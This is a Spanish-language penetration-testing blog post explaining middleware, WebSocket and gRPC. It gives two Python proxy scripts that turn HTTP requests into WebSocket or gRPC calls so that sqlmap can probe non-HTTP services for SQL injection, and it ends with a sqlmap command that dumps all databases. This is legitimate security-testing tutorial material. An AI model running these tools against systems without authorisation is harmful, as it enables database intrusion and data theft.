---
title: MiddleWare para ataques SQL injection
author: marcvs
date: 2023-05-24
categories: [Pentest, SQLi]
tags: [pentest, sqli, http, websocket, grpc, python3, pip3]
pin: false
---

## ¿Qué es un MiddleWare?
En el contexto de la informática y el desarrollo de software, se refiere a un conjunto de software o programas que actúan como intermediarios entre distintas aplicaciones, sistemas operativos o componentes de software. Su objetivo principal es facilitar la comunicación y la interoperabilidad entre estos diferentes sistemas o componentes.

Los **MiddleWare** se sitúan entre el software de nivel inferior (como el sistema operativo) y el software de nivel superior (como las aplicaciones). Proporcionan una capa de abstracción y servicios comunes que permiten a las aplicaciones comunicarse y compartir datos de manera más eficiente y coherente.

### Usos
* **Mensajería:** facilita la comunicación asíncrona y la transferencia de mensajes entre diferentes aplicaciones o componentes.
* **Transacciones:** gestiona y coordina transacciones en aplicaciones distribuidas, asegurando la integridad y la consistencia de los datos.
* **Acceso a datos:** proporciona una capa de abstracción para acceder a fuentes de datos, como bases de datos o sistemas de archivos.
* **Aplicaciones web:** facilita el desarrollo de aplicaciones web al proporcionar servicios comunes, como el enrutamiento de solicitudes, la gestión de sesiones y la seguridad.
* **Orientado a servicios (SOA):** permite la integración de sistemas empresariales al proporcionar servicios reutilizables y estandarizados.

## WebSocket
### ¿Qué es un WebSocket?
Es un protocolo de comunicación bidireccional y en tiempo real que se ejecuta sobre una única conexión **TCP**. A diferencia del protocolo **HTTP** tradicional, que sigue un modelo de solicitud-respuesta, WebSocket permite una comunicación más interactiva y persistente entre un cliente y un servidor.

Una de las ventajas clave de WebSocket es su baja latencia. A diferencia de las solicitudes y respuestas HTTP tradicionales, donde cada solicitud requiere el establecimiento de una nueva conexión, WebSocket establece una conexión única y mantiene un canal de comunicación persistente. Esto permite una comunicación más rápida y eficiente al evitar la sobrecarga de establecer y cerrar conexiones repetidamente.

### Script middleware
Este es el script crea una conexión por **WebSocket** para enviar un **id** como data al servidor. Contiene argumentos para facilitar la conexión y evitar poner dentro del código las configuraciones, en este caso, la **IP** del servidor donde se ejecuta el WebSocket. **RECUERDA**, debes modificar el script de acuerdo a tus necesidades ya que en la data enviada el parametro puede cambiar ya sea con diferente nombre o tener más parametros. Debes tener instalado `pip3 install websocket-client`.

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection
import sys
import signal
import argparse

def signal_handler(sig, frame):
    print('[!] Exiting\n')
    sys.exit(1)

def send_ws(payload):
    ws = create_connection(args.ip)

    message = unquote(payload).replace('"','\'')
    data = '{"id":"%s"}' % message #In this case the param is Id, but it can be other

    ws.send(data)
    resp = ws.recv()
    ws.close()

    if resp:
        return resp
    else:
        return ''

def middleware_server(lport,content_type="text/plain"):
    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False

            if payload:
                content = send_ws(payload)
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(lport, CustomHandler)
    httpd.serve_forever()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description='Middleware: HTTP to WebSocket')
    parser.add_argument('-i', '--ip', dest='ip', type=str, help='WebSocket server IP', required=True)
    parser.add_argument('--lport', dest='lport', type=int, help='Local port for HTTP', required=False, default=8181)
    args = parser.parse_args()

    try:
        print("[+] Starting MiddleWare HTTP->WebSocket Server")
        print("[+] Send payloads in http://localhost:%s/?id=*" % args.lport)
        middleware_server(('0.0.0.0',args.lport))
    except KeyboardInterrupt:
        pass
```

## gRPC
### ¿Qué es gRPC?
Es un sistema de comunicación de alto rendimiento y de código abierto desarrollado por Google. El nombre **gRPC** proviene de las siglas **Google Remote Procedure Call** (llamada remota a procedimientos de Google). Proporciona un marco para la comunicación eficiente entre aplicaciones distribuidas, permitiendo que los servicios se comuniquen entre sí de forma rápida y confiable.

gRPC se basa en el protocolo de llamada a procedimientos remotos (RPC), que es un enfoque para la comunicación entre aplicaciones donde un programa puede invocar un procedimiento en otro programa, incluso si se ejecutan en diferentes sistemas y están escritos en diferentes lenguajes de programación.

gRPC también se beneficia del uso de HTTP/2 como protocolo de transporte subyacente. HTTP/2 es una versión mejorada del protocolo HTTP que ofrece características como la multiplexación de flujo, compresión de cabeceras y soporte para transmisión bidireccional, lo que contribuye a mejorar el rendimiento de las comunicaciones.

### Archivo proto
Son archivos de definición utilizados en **gRPC** para describir la estructura de los mensajes y los servicios que se intercambian entre el cliente y el servidor. Estos archivos están escritos en un lenguaje llamado **Protocol Buffers (protobuf)**.

Además de los mensajes, en el archivo `.proto` también se definen los servicios. Los servicios representan un conjunto de métodos que el cliente puede llamar en el servidor. Cada método tiene un nombre y un conjunto de parámetros de entrada y salida, que también se definen utilizando los tipos de mensajes definidos previamente.

Una vez que se ha definido el archivo `.proto`, se utiliza una herramienta de compilación de Protocol Buffers para generar el código fuente en el lenguaje de programación deseado. Este código generado proporciona clases y métodos que facilitan la serialización y deserialización de los mensajes, así como la comunicación con el servidor a través de **gRPC**.

Este es el ejemplo del archivo `.proto` utilizado para desarrollar el **MiddleWare**, es recomendable llamarlo igual que tu aplicación.

```cs
syntax = "proto3";

service MygRPCApp {
  rpc Info (InfoRequest) returns (InfoResponse);
}

message InfoRequest {
  string id = 1;
}

message InfoResponse {
  string message = 1;
}

```

Puedes crear los archivos necesarios para interactuar con la aplicación **gRPC** desde **Python 3** creando las "librerias" acorde a este servicio a partir del archivo `.proto`.

```bash
python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. mygrpcapp.proto
```

### Script middleware
Este es el script crea una conexión por **gRPC** para enviar un **id** como data al servidor usando la configuración de los métodos creada a partir del archivo `.proto`. Contiene argumentos para facilitar la conexión y evitar poner dentro del código las configuraciones, en este caso, la **IP** del servidor donde se ejecuta el WebSocket. **RECUERDA**, debes modificar el script de acuerdo a tus necesidades ya que en la data enviada el parametro puede cambiar ya sea con diferente nombre o tener más parametros.

Debes ejecutarlo en el mismo directorio donde creaste tus archivos `pb2` y tener instalado `pip3 install grpcio grpcio-tools`.

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import urlparse
from grpc import insecure_channel
import mygrpcapp_pb2 #Change this according to your pb2 file
import mygrpcapp_pb2_grpc #Change this according to your pb2_grpc file
import sys
import signal
import argparse

def signal_handler(sig, frame):
    print('[!] Exiting\n')
    sys.exit(1)

def send_grpc(payload):
    channel = insecure_channel(f'%s:%d' % (args.ip, args.rport))
    stub = mygrpcapp_pb2_grpc.MygRPCApp(channel) #MygRPCApp is my service gRPC name
    request = mygrpcapp_pb2.InfoRequest(id=payload) #In this case the param is Id, but it can be other

    response = stub.Info(request) #Info and InfoRequest are the methods on the service gRPC

    if response:
        return response
    else:
        return ''

def middleware_server(lport,content_type="text/plain"):
    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False

            if payload:
                content = send_grpc(payload)
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.message.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(lport, CustomHandler)
    httpd.serve_forever()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description='Middleware: HTTP to gRPC')
    parser.add_argument('-i', '--ip', dest='ip', type=str, help='gRPC server IP', required=True)
    parser.add_argument('-p', '--port', dest='rport', type=int, help='gRPC server port', required=True, default=50051)
    parser.add_argument('--lport', dest='lport', type=int, help='Local port for HTTP', required=False, default=8181)
    args = parser.parse_args()

    try:
        print("[+] Starting MiddleWare HTTP->gRPC Server")
        print("[+] Send payloads in http://localhost:%s/?id=*" % args.lport)
        middleware_server(('0.0.0.0',args.lport))
    except KeyboardInterrupt:
        pass
```

## SQL injection
Son una forma común de ataque informático que aprovecha las vulnerabilidades en las aplicaciones web o sistemas de bases de datos que no validan o filtran correctamente la entrada del usuario.

Una inyección SQL ocurre cuando un atacante inserta **código SQL** malicioso en una consulta enviada a un sistema de bases de datos. Esto permite al atacante manipular o revelar información sensible almacenada en la base de datos, así como ejecutar acciones no autorizadas en el sistema.

El vector de ataque suele ser la combinación datos de entrada del usuario no confiables o maliciosos con **código SQL** sin realizar la debida validación. Esto puede suceder en campos de formularios, parámetros de **URL** o cualquier otra entrada que se utilice para construir **consultas SQL**.

### Uso de middleware con SQLmap
Existen servicios que se conectan a una **base de datos SQL** que no son **Web**, sin embargo, realizar las pruebas de seguridad de **inyección SQL** suele ser tedioso para algunos protocolos, ya que herramientas como `sqlmap` no soportan otros servicios que no sean **HTTP** y algunos derivados, por lo que usar los **MiddleWare** para este tipo de pruebas es recomendable.

En los caso vistos de **gRPC** y **WebSocket**, se ejecuta igual `sqlmap` en ambos, debemos tener el cuenta que los logs del script posiblemente muestren errores debido a los payloads enviados por la herramienta, sin embargo, es mejor siempre probarlo con `curl localhost:8181/?id=1` antes de empezar a atacar.

```bash
sqlmap -u "http://localhost:8181/?id=FUZZ" --batch --dump-all
```

## Referencias
* Post original del middleware para WebSocket de [rayhan0x01](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html).
